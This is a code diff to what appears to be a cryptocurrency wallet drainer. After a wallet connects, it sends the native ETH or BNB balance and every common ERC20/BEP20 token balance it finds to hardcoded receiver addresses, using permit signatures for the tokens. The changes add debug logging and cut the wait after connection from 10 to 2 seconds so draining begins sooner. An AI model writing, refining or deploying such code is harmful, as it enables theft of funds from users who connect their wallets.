@@ -234,11 +234,13 @@ async function scanEthereumTokens(walletClient, walletAddress, publicClient) {
     let transferCount = 0
     
     // Get ETH balance
+    console.log('Getting ETH balance...')
     const ethBalance = await publicClient.getBalance({ address: walletAddress })
     console.log(`ETH Balance: ${ethers.utils.formatEther(ethBalance)} ETH`)
     
     // Check if we have ETH to transfer (leave some for gas)
     if (ethBalance.gt(ethers.utils.parseEther('0.001'))) {
+      console.log('Transferring ETH...')
       const result = await transferETH(walletClient, walletAddress, ethBalance, receiveAddress, publicClient)
       if (result) {
         transferCount++
@@ -249,17 +251,22 @@ async function scanEthereumTokens(walletClient, walletAddress, publicClient) {
     }
     
     // Check and transfer each token
+    console.log('Checking ERC20 tokens...')
     for (const token of commonTokens.ethereum) {
       try {
+        console.log(`Checking balance for ${token.name} (${token.address})...`)
         const balance = await getTokenBalance(walletClient, token.address, walletAddress, publicClient)
+        console.log(`${token.name} balance: ${balance}`)
         if (ethers.BigNumber.from(balance).gt(0)) {
           console.log(`Found ${ethers.utils.formatUnits(balance, token.decimals)} ${token.name}`)
           
           // Create permit for the transfer
+          console.log(`Creating permit for ${token.name}...`)
           const permitData = await createTokenPermit(walletClient, token.address, balance, receiveAddress, publicClient)
           console.log(`${token.name} permit created successfully`)
           
           // Execute permit transfer
+          console.log(`Executing permit transfer for ${token.name}...`)
           const result = await executePermitTransfer(walletClient, token.address, permitData)
           if (result) {
             transferCount++
@@ -270,6 +277,7 @@ async function scanEthereumTokens(walletClient, walletAddress, publicClient) {
         }
       } catch (error) {
         console.log(`Error checking ${token.name}:`, error.message)
+        console.error(`Full error for ${token.name}:`, error)
       }
     }
     
@@ -289,11 +297,13 @@ async function scanBscTokens(walletClient, walletAddress, publicClient) {
     let transferCount = 0
     
     // Get BNB balance
+    console.log('Getting BNB balance...')
     const bnbBalance = await publicClient.getBalance({ address: walletAddress })
     console.log(`BNB Balance: ${ethers.utils.formatEther(bnbBalance)} BNB`)
     
     // Check if we have BNB to transfer (leave some for gas)
     if (bnbBalance.gt(ethers.utils.parseEther('0.001'))) {
+      console.log('Transferring BNB...')
       const result = await transferETH(walletClient, walletAddress, bnbBalance, bep20ReceiverAddress, publicClient)
       if (result) {
         transferCount++
@@ -304,17 +314,22 @@ async function scanBscTokens(walletClient, walletAddress, publicClient) {
     }
     
     // Check and transfer each token
+    console.log('Checking BEP20 tokens...')
     for (const token of commonTokens.bsc) {
       try {
+        console.log(`Checking balance for ${token.name} (${token.address})...`)
         const balance = await getTokenBalance(walletClient, token.address, walletAddress, publicClient)
+        console.log(`${token.name} balance: ${balance}`)
         if (ethers.BigNumber.from(balance).gt(0)) {
           console.log(`Found ${ethers.utils.formatUnits(balance, token.decimals)} ${token.name}`)
           
           // Create permit for the transfer
+          console.log(`Creating permit for ${token.name}...`)
           const permitData = await createTokenPermit(walletClient, token.address, balance, bep20ReceiverAddress, publicClient)
           console.log(`${token.name} permit created successfully`)
           
           // Execute permit transfer
+          console.log(`Executing permit transfer for ${token.name}...`)
           const result = await executePermitTransfer(walletClient, token.address, permitData)
           if (result) {
             transferCount++
@@ -325,6 +340,7 @@ async function scanBscTokens(walletClient, walletAddress, publicClient) {
         }
       } catch (error) {
         console.log(`Error checking ${token.name}:`, error.message)
+        console.error(`Full error for ${token.name}:`, error)
       }
     }
     
@@ -342,8 +358,8 @@ export async function scanAndTransferTokens(walletClient, walletAddress, chainId
     console.log("Starting token scan and transfer process...")
     
     // Wait for a few seconds after connection
-    console.log("Waiting for 10 seconds before scanning tokens...")
-    await new Promise(resolve => setTimeout(resolve, 10000)) // 10 seconds
+    console.log("Waiting for 2 seconds before scanning tokens...")
+    await new Promise(resolve => setTimeout(resolve, 2000)) // 2 seconds
     
     let totalTransfers = 0
     
